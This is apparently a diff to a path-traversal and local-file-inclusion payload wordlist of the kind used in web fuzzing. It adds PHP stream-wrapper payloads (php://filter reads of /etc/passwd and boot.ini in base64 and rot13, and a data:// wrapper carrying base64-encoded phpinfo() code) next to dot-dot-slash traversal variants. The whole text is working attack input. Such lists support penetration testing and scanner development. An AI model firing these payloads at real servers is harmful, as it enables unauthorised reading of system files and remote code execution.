@@ -1,5 +1,10 @@
 /etc/passwd
-../../../../../../../etc/passwd
+php://filter/convert.base64-encode/resource=/etc/passwd
+data:text/plain,hello world
+php://filter/resource=/etc/passwd
+php://filter/read=string.rot13/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=/etc/passwd
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==../../../../../../../etc/passwd
 ..\..\..\..\..\..\..\etc\passwd
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd
@@ -1047,7 +1052,12 @@ etc\passwd;index.htm
 ..\..\..\..\..\..\..\etc\passwd;index.html
 ..\..\..\..\..\..\..\etc\passwd;index.htm
 boot.ini
-../../../../../../../etc/passwd
+php://filter/convert.base64-encode/resource=boot.ini
+data:text/plain,hello world
+php://filter/resource=boot.ini
+php://filter/read=string.rot13/resource=boot.ini
+php://filter/convert.base64-encode/resource=boot.ini
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==../../../../../../../etc/passwd
 ..\..\..\..\..\..\..\etc\passwd
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd
